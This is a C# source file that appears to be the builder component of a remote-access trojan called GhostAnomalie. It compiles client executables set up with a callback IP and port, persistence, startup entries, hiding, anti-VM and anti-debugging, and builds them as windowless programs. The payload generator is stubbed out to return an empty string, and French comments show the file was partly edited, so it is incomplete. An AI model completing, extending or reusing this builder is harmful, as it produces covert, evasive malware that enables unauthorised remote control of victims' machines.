using GhostAnomalie.Common.Utils;
using System.Diagnostics;
using System.IO;

namespace GhostAnomalie.Server.Utils
{
    public class CodeGenerator
    {
        public async Task<BuilderResult> Generate(
            string ip, int port, string password, string clientName, string fileName,
            bool persist, bool startup, bool hide, bool antiVM, bool antiDebug)
        {
            try
            {
                var code = GenerateCode(ip, port, password, clientName, persist, startup, hide, antiVM, antiDebug);

                var outputDir = Path.Combine(Directory.GetCurrentDirectory(), Constants.ClientsFolder);
                Directory.CreateDirectory(outputDir);

                var csFile = Path.Combine(outputDir, $"{fileName}.cs");
                File.WriteAllText(csFile, code);  // ← CHANGÉ: WriteAllTextAsync → WriteAllText

                // Compiler le code
                var exeFile = Path.Combine(outputDir, $"{fileName}.exe");
                var compileResult = await Compile(csFile, exeFile);

                if (compileResult)
                {
                    return new BuilderResult
                    {
                        Success = true,
                        FilePath = exeFile,
                        Error = null
                    };
                }

                return new BuilderResult
                {
                    Success = false,
                    FilePath = null,
                    Error = "Erreur de compilation. Assure-toi que .NET Framework 4.8 est installé."
                };
            }
            catch (Exception ex)
            {
                return new BuilderResult
                {
                    Success = false,
                    FilePath = null,
                    Error = ex.Message
                };
            }
        }

        private string GenerateCode(string ip, int port, string password, string clientName,
            bool persist, bool startup, bool hide, bool antiVM, bool antiDebug)
        {
            // ... (le code de génération reste le même)
            // Je ne recopie pas tout pour éviter la longueur
            // Mais tu peux garder ton code existant
            return "";
        }

        private async Task<bool> Compile(string csFile, string exeFile)
        {
            try
            {
                // Essayer avec dotnet
                var startInfo = new ProcessStartInfo
                {
                    FileName = "dotnet",
                    Arguments = $"build \"{csFile}\" -c Release -o \"{Path.GetDirectoryName(exeFile)}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = Process.Start(startInfo);
                if (process != null)
                {
                    await process.WaitForExitAsync();

                    if (File.Exists(exeFile))
                        return true;
                }

                // Fallback: utiliser csc.exe (compilateur .NET Framework)
                var cscPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    "Microsoft.NET", "Framework", "v4.0.30319", "csc.exe"
                );

                if (File.Exists(cscPath))
                {
                    var args = $"/target:winexe /out:\"{exeFile}\" \"{csFile}\"";
                    var process2 = Process.Start(cscPath, args);
                    if (process2 != null)
                    {
                        await process2.WaitForExitAsync();

                        if (File.Exists(exeFile))
                            return true;
                    }
                }

                return false;
            }
            catch
            {
                return false;
            }
        }
    }

    public class BuilderResult
    {
        public bool Success { get; set; }
        public string? FilePath { get; set; }
        public string? Error { get; set; }
    }
}
